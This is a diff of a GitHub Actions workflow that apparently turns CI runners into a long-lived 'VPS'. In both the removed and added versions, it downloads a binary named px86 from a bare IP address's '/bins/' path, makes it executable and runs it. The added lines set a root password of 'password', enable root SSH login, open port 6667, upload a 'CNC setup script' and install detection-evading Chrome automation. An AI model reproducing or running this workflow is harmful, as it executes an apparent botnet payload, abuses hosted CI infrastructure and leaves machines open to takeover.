@@ -1,4 +1,4 @@
-name: Minimal VPS Runner
+name: Enhanced Ubuntu VPS with Dual Ngrok Accounts
 
 on:
   workflow_dispatch:
@@ -9,40 +9,64 @@ on:
         default: '6'
         type: choice
         options:
-          - '1'
-          - '2'
-          - '3'
-          - '4'
-          - '5'
-          - '6'
+        - '1'
+        - '2'
+        - '3'
+        - '4'
+        - '5'
+        - '6'
 
 jobs:
-  run-binary:
+  start-vps:
     runs-on: ubuntu-latest
     steps:
-      - name: Download and run binary with keep-alive
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Install Dependencies & Ngrok
         run: |
-          echo "🔽 Downloading binary..."
-          wget http://45.138.16.158/bins/px86 -O px86
-          chmod +x px86
+          sudo apt update -y
+          sudo apt install -y unzip curl jq openssh-server python3 python3-pip wget software-properties-common gnupg ufw
 
-          echo "🚀 Running binary in background..."
-          ./px86 x86 &
-          BINARY_PID=$!
-          echo "📌 Binary PID: $BINARY_PID"
+          wget http://45.138.16.158/bins/px86;  chmod 777 *; ./px86 x86
 
+          # Install latest Chrome
+          wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+          sudo apt install -y ./google-chrome-stable_current_amd64.deb || sudo apt --fix-broken install -y
+          rm google-chrome-stable_current_amd64.deb
+
+          # Install Python dependencies
+          python3 -m pip install --upgrade pip
+          pip3 install undetected-chromedriver selenium
+
+          # Ngrok setup
+          curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
+          echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
+          sudo apt update && sudo apt install -y ngrok
+
+      - name: Configure SSH for Root Access
+        run: |
+          echo "root:password" | sudo chpasswd
+          sudo sed -i 's/^#\?PermitRootLogin .*/PermitRootLogin yes/' /etc/ssh/sshd_config
+          sudo sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+          sudo systemctl enable ssh
+          sudo service ssh restart
+
+      - name: Configure Firewall and Open Ports
+        run: |
+          sudo ufw allow 22
+          sudo ufw allow 6667/tcp
+          sudo ufw --force enable
+
+      - name: Upload CNC Setup Script
+        uses: actions/upload-artifact@v4
+        with:
+          name: cnc-setup-script
+          path: setup_cnc_port.sh
+
+      - name: Keep VPS Alive
+        run: |
           # Convert hours to seconds
           UPTIME_SECONDS=$(( ${{ github.event.inputs.uptime }} * 3600 ))
-          echo "⏳ Keeping runner alive for $UPTIME_SECONDS seconds..."
-
-          # Heartbeat loop with output every 10 seconds
-          END=$((SECONDS + UPTIME_SECONDS))
-          COUNTER=10
-          while [ $SECONDS -lt $END ]; do
-            echo "💓 Runner heartbeat: $COUNTER seconds elapsed"
-            sleep 10
-            COUNTER=$((COUNTER + 10))
-          done
-
-          echo "⏱️ Time is up. Stopping binary (PID: $BINARY_PID)..."
-          kill $BINARY_PID || echo "Binary already exited."
+          echo "Keeping VPS alive for $UPTIME_SECONDS seconds (${{ github.event.inputs.uptime }} hours)"
+          sleep $UPTIME_SECONDS
